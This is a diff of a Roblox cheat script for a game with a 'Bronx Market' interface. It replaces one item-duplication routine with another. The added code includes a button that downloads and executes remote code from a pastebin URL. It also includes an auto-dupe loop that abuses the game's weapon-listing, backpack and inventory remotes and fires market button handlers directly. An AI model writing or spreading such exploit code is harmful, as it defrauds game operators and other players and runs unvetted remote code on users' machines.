@@ -787,140 +787,153 @@
 local recoveryTab = Window:Tab({ Text = "Recovery" })
 local DupeSection = recoveryTab:Section({ Text = "Dupe" })
 
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local StarterGui = game:GetService("StarterGui")
-
-local keepGunsEnabled = false
-
-local excludedItems = {
-    "Phone", "Fist", "Car Keys", "Gun Permit",
-    ".UziMag", ".Bullets", "5.56", "7.62", ".9mm", 
-    ".Extended", ".FNMag", ".MacMag", ".TecMag", ".Drum",
-    "Lemonade", "FakeCard", "G26", "Shiesty", "RawSteak",
-    "Ice-Fruit Bag", "Ice-Fruit Cupz", "FijiWater", "FreshWater",
-    "Red Elite Bag", "Black Elite Bag", "Grab", "Blue Elite Bag",
-    "Drac Bag", "Yellow RCR Bag", "Black RCR Bag",
-    "Red RCR Bag", "Tan RCR Bag", "Black Designer Bag",
-    "BluGloves", "WhiteGloves", "BlackGloves",
-    "PinkCamoGloves", "RedCamoGloves", "BluCamoGloves",
-    "Water", "RawChicken"
-}
-
-local function normalize(str)
-    return str:lower():gsub("%W", "")
-end
-
-local function isExcluded(toolName)
-    local normTool = normalize(toolName)
-    for _, excluded in ipairs(excludedItems) do
-        if normalize(excluded) == normTool then
-            return true
-        end
-    end
-    return false
-end
-
-local ListWeaponRemote = ReplicatedStorage:WaitForChild("ListWeaponRemote")
-
-local function sellItem(itemName)
-    local args = {
-        [1] = itemName,
-        [2] = 999999
-    }
-    ListWeaponRemote:FireServer(unpack(args))
-end
-
-local cachedGuns = {}
-
-local function cacheGuns()
-    cachedGuns = {}
-    for _, item in pairs(LocalPlayer.Backpack:GetChildren()) do
-        if item:IsA("Tool") and not isExcluded(item.Name) then
-            table.insert(cachedGuns, item.Name)
-        end
-    end
-end
-
-local function showNotification(message)
-    pcall(function()
-        StarterGui:SetCore("SendNotification", {
-            Title = "Revamped.City",
-            Text = message,
-            Duration = 5
-        })
-    end)
-end
-
-local function startSellingGuns()
-    task.spawn(function()
-        if #cachedGuns == 0 then
-            showNotification("No guns found to sell.")
-            return
-        end
-        for _, gunName in ipairs(cachedGuns) do
-            sellItem(gunName)
-            task.wait(3.3)
-        end
-        showNotification("Finished selling guns.")
-        keepGunsEnabled = false
-    end)
-end
-
-local function onDeath()
-    wait(0.1) -- small delay for death event to settle
-    if keepGunsEnabled then
-        cacheGuns()
-        startSellingGuns()
-    end
-end
-
-LocalPlayer.CharacterAdded:Connect(function(character)
-    local humanoid = character:WaitForChild("Humanoid", 5)
-    if humanoid then
-        humanoid.Died:Connect(onDeath)
-    end
-end)
-
-if LocalPlayer.Character then
-    local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
-    if humanoid then
-        humanoid.Died:Connect(onDeath)
-    end
-end
-
-local function setSpawn()
-    local character = LocalPlayer.Character
-    if not character then return end
-    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
-    local humanoid = character:FindFirstChild("Humanoid")
-    if not humanoidRootPart or not humanoid then return end
-
-    local lastPosition = humanoidRootPart.CFrame
-    humanoid.Health = 0 -- kill player to respawn
-
-    LocalPlayer.CharacterAdded:Wait()
-    local newCharacter = LocalPlayer.Character
-    local newRoot = newCharacter:WaitForChild("HumanoidRootPart")
-
-    if lastPosition then
-        newRoot.CFrame = lastPosition
-    end
-end
 
 DupeSection:Button({
     Text = "Market Dupe",
     Callback = function()
-        if not keepGunsEnabled then
-            keepGunsEnabled = true
-            showNotification("Keep guns enabled until next respawn!")
-            setSpawn()
+        -- Execute external script
+        loadstring(game:HttpGet('https://pastebin.com/raw/PYk9fkSH'))()
+    end
+})
+
+--// Dupe Logic
+local statusText = "Broken Dupe Status"
+local dupeInProgress = false
+local isAutoDuping = false
+local autoDupeConnection
+
+local function executeDupe(updateStatus)
+    if dupeInProgress then return end
+    dupeInProgress = true
+
+    if updateStatus then updateStatus("Duping...", Color3.fromRGB(255,255,0)) end
+
+    -- simulate progress (replacing loading bar)
+    task.wait(1)
+
+    if game:GetService("ReplicatedStorage"):FindFirstChild("message") and 
+       game:GetService("ReplicatedStorage").message:FindFirstChild("Frame") and 
+       game:GetService("ReplicatedStorage").message.Frame:FindFirstChild("TextLabel") then
+        game:GetService("ReplicatedStorage").message.Frame.TextLabel:Destroy()
+    end
+
+    local character = game.Players.LocalPlayer.Character
+    local backpack = game.Players.LocalPlayer:FindFirstChild("Backpack")
+
+    if backpack then
+        for _, item in pairs(backpack:GetChildren()) do
+            if item:FindFirstChild("Handle") and item.Name ~= "Fist" and item.Name ~= "Phone" then
+                local humanoid = character:FindFirstChildOfClass("Humanoid")
+                if humanoid then
+                    humanoid:UnequipTools()
+                    task.wait(0.1)
+                    humanoid:EquipTool(item)
+                    task.wait(0.01)
+                end
+            end
+        end
+    end
+
+    local gunTool = character:FindFirstChildOfClass("Tool")
+    if not gunTool then
+        if updateStatus then updateStatus("No weapon found!", Color3.fromRGB(255,0,0)) end
+        dupeInProgress = false
+        return
+    end
+
+    local gunName = gunTool.Name
+    local marketGui = game:GetService("Players").LocalPlayer.PlayerGui["Bronx Market 2"]
+    if marketGui then
+        local marketLabel = marketGui.Body.Frames.Market.TextLabel
+        if marketLabel then
+            marketLabel.Text = "Picked: " .. gunName
+        end
+    end
+
+    local args = { gunName, 900000 }
+    game:GetService("ReplicatedStorage"):WaitForChild("ListWeaponRemote"):FireServer(unpack(args))
+
+    task.wait(0.25)
+
+    local ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
+    local Players = game:GetService("Players")
+    local Workspace = game:GetService("Workspace")
+
+    local function GetCharacter()
+        return Players.LocalPlayer.Character
+    end
+
+    local InventoryRemote = ReplicatedStorage:WaitForChild("Inventory")
+    local BackpackRemote = ReplicatedStorage:WaitForChild("BackpackRemote")
+
+    local character = GetCharacter()
+    if character and character:FindFirstChildOfClass("Tool") then
+        local gunTool = character:FindFirstChildOfClass("Tool")
+        local gunName = gunTool.Name
+
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+        if humanoid then humanoid:UnequipTools() end
+        BackpackRemote:InvokeServer("Store", gunName)
+
+        task.wait(0.5)
+
+        task.spawn(function()
+            InventoryRemote:FireServer("Change", gunName, "Backpack", safe)
+        end)
+        task.wait(1.2)
+
+        BackpackRemote:InvokeServer("Grab", gunName)
+    end
+
+    task.wait(1)
+
+    local function requireMarket()
+        local marketGui = game:GetService("Players").LocalPlayer.PlayerGui["Bronx Market 2"]
+        local selectedGun = marketGui.Body.Frames.Market.TextLabel.Text:match("Picked: (.+)")
+
+        if selectedGun then
+            local gunButton = marketGui.Body.Frames.Guns.ScrollingFrame[selectedGun]
+            if gunButton then
+                for _, connection in pairs(getconnections(gunButton.MouseButton1Click)) do
+                    connection:Fire()
+                end
+            end
+        end
+    end
+
+    task.spawn(requireMarket)
+
+    if updateStatus then updateStatus("Dupe completed!", Color3.fromRGB(0,255,0)) end
+    dupeInProgress = false
+end
+
+local StatusLabel = DupeSection:Label({ Text = statusText })
+
+
+-- Auto Dupe Toggle
+DupeSection:Toggle({
+    Text = "Broken Dupe",
+    Callback = function(state)
+        isAutoDuping = state
+        if state then
+            autoDupeConnection = game:GetService("RunService").Heartbeat:Connect(function()
+                if not dupeInProgress then
+                    executeDupe(function(txt, col)
+                        statusText = txt
+                        StatusLabel:Set({ Text = txt })
+                    end)
+                end
+                task.wait(5)
+            end)
         else
-            showNotification("Already enabled! It will reset on next respawn.")
+            if autoDupeConnection then
+                autoDupeConnection:Disconnect()
+                autoDupeConnection = nil
+            end
         end
     end
 })
+
 
 
     local MoneySection = recoveryTab:Section({ Text = "Max Money", Side = "Right" })
